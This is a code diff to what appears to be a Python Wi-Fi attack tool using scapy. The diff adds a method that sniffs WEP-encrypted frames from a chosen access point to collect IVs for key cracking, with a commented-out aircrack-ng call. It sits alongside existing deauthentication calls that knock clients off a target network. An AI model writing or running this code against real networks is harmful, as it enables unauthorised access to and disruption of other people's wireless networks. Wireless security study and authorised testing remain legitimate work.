@@ -1,6 +1,6 @@
 import os
 from typing import Union
-from scapy.all import Dot11Beacon, Dot11, sniff
+from scapy.all import Dot11Beacon, Dot11, sniff, Dot11WEP, PcapWriter
 from threading import Thread
 from deauth import deauth, deauth_with_beacon
 from wifi import Wifi
@@ -301,3 +301,29 @@ class Scanner:
             target_client = input("Input client MAC for deauth: ")
 
         deauth_with_beacon(self.interface, target_ap.SSID, target_ap.BSSID, target_client)
+
+    def get_ivs(self):
+        # Create file to save IVs to
+        pktdump = PcapWriter("iv_file.cap", append=True, sync=True)
+
+        # Filter for WEP packets
+        def filter_WEP(p):
+            if p.haslayer(Dot11WEP):
+                print("Found WEP packet")
+                pktdump.write(p)
+
+        # For testing
+        # sniff(offline="output-01.cap", prn=filter_WEP, count=int(time_for_sniff))
+
+        # Get AP to sniff from
+        target_ap = self.prompt_for_ap()
+        if not target_ap.crypto == "WEP":
+            print("AP is not WEP encrypted. Please choose another AP.")
+            return
+        set_channel(self.interface, target_ap.channel)
+        time_for_sniff = input("How long do you want to capture IVs? (seconds): ")
+        
+        sniff(iface=self.interface, prn=filter_WEP, timeout=int(time_for_sniff))
+
+        print(f'IVs saved to file: {pktdump.filename}')
+        # os.system(f'Aircrack-ng {pktdump.filename}') Doesn't work
